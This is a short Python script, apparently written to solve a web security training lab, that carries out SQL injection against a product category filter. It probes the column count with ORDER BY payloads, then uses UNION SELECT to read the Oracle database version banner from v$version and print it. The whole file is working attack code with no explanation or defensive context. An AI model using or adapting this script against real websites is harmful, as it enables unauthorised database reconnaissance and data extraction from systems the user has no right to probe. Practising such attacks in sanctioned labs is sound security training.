import requests
import sys
from bs4 import BeautifulSoup

def determine_columns(lab_url):
    num_of_columns = 0
    for i in range(1,20):
        res = requests.get(f"{lab_url}/filter?category=x' ORDER BY {i}--")
        if res.status_code == 500:
            num_of_columns = i - 1
            break
    return num_of_columns

def extract_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    version_string = soup.find('tbody')
    return version_string.get_text().strip()

def get_db_version(num_of_columns):
    for i in range(num_of_columns):
        payload = ["NULL"] * num_of_columns
        payload[i] = "banner"
        payload = ",".join(payload)
        url = f"{lab_url}/filter?category=x' UNION SELECT {payload} FROM v$version--"
        res = requests.get(url)
        if res.status_code == 200:
            return extract_text(res)

if __name__=="__main__":
    try:
        lab_url = sys.argv[1].rstrip('/')
        num_of_columns = determine_columns(lab_url)
        print(get_db_version(num_of_columns))

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://example.com")

